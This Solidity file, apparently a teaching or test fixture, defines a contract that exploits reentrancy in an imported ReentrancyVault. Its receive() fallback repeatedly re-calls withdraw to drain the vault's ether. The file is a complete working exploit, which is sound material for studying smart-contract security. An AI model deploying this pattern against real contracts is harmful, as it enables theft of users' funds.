// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./ReentrancyVault.sol";

contract ReentrancyAttacker {
    ReentrancyVault public target;
    constructor(address _t) { target = ReentrancyVault(_t); }
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }
    function attack() external payable {
        require(msg.value == 1 ether);
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }
}
